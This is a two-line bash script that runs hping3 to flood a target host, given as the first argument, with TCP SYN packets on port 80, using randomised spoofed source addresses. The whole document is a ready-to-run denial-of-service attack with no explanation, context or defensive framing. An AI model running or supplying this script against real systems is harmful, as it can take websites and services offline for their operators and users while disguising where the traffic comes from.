#!/bin/bash
hping3 -S -p 80 $1 --flood --rand-source
